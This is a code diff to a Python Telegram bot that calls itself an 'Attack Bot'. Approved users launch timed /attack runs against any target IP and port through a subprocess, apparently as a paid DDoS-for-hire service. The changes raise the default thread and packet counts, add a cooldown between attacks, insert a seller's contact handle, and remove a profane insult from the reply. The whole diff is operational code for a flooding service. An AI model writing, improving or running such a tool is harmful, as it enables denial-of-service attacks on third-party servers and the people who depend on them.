@@ -5,12 +5,19 @@ import asyncio
 from telegram import Update, Chat, InputFile
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 from config import BOT_TOKEN, OWNER_USERNAME, CHANNEL_LINK, CHANNEL_LOGO
+import time
 
 USER_FILE = "users.json"
 ADMIN_FILE = "admins.json"
-DEFAULT_THREADS = 2000
-DEFAULT_PACKET = 13
+DEFAULT_THREADS = 2900
+DEFAULT_PACKET = 20
 DEFAULT_DURATION = 200  # Default attack duration
+
+# Store the last attack time for each user (in seconds)
+last_attack_time = {}
+
+# Set a timeout in seconds (e.g., 60 seconds between attacks)
+ATTACK_TIMEOUT = 260  # Example: 60 seconds timeout
 
 users = {}
 admins = {}
@@ -45,7 +52,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     message = (
         "🚀 **Welcome to the Attack Bot!** 🚀\n\n"
         "🔹 This bot allows you to launch attacks using /attack.\n"
-        "🔹 Contact me for paid services.\n"
+        "🔹 Contact me for paid services @Riyahacksyt.\n"
         "🔹 Join our channel for updates:\n"
         f"[🔗 Click Here]({CHANNEL_LINK})\n\n"
         "💻 **Developed by**: " + f"@{OWNER_USERNAME}"
@@ -149,6 +156,14 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         await update.message.reply_text("❌ You are not approved to use this command. Request approval from an Admin or Owner.")
         return
 
+    # Check if the user has attacked recently
+    current_time = time.time()
+    last_time = last_attack_time.get(user_id, 0)
+    if current_time - last_time < ATTACK_TIMEOUT:
+        remaining_time = ATTACK_TIMEOUT - (current_time - last_time)
+        await update.message.reply_text(f"⚠️ You must wait {int(remaining_time)} seconds before attacking again.")
+        return
+
     if len(context.args) != 2:
         await update.message.reply_text('Usage: /attack <target_ip> <port>')
         return
@@ -164,6 +179,9 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     process = subprocess.Popen(command)
     user_processes[user_id] = process
 
+    # Record the time of this attack
+    last_attack_time[user_id] = current_time
+
     await update.message.reply_text(f'🚀 Attack started: {target_ip}:{port} for {DEFAULT_DURATION} seconds.')
 
     await asyncio.sleep(DEFAULT_DURATION)
@@ -171,7 +189,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     process.terminate()
     del user_processes[user_id]
 
-    await update.message.reply_text(f'✅ Attack finished: {target_ip}:{port}.   TERI MAA KI KASAM HA TEREKO FEEDBACK DE RE LVDE')
+    await update.message.reply_text(f'✅ Attack finished: {target_ip}:{port}.')
 
 async def all_members(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Show all approved users and admins (owner and admins only)."""
